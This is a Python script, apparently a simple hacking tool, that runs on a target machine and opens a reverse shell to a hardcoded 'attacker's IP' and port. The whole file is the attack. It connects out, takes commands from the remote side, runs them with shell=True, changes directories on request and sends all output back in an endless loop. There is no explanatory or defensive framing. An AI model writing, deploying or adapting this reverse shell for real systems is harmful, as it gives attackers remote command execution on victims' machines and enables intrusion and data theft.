# will be run at the target machine from which rev shell will be spawned
import socket
import os
import subprocess

s = socket.socket()
host = '192.168.43.113' # attacker's IP
port = 1234 # attacker's port

s.connect((host, port))

while True:
    currDir = os.getcwd() + "> "
    s.send(str.encode(currDir))
    resp = s.recv(1024)
    data = resp.decode("utf-8")
    output_str = ""
    print(">> "+data) # debugging step
    if data[:2] == "cd":
        newPath = data[3:]
        if data[3:] == "..":
            slash = "/"
            parts = os.getcwd().split(slash)
            newPath = slash.join(parts[:-1])
        if len(newPath) > 0:
            os.chdir(newPath)
    else:
        cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
    if output_str == "":
        output_str = "no-output"
    print("output: "+output_str) # debugging step
    s.send(str.encode(output_str))
    s.recv(1024)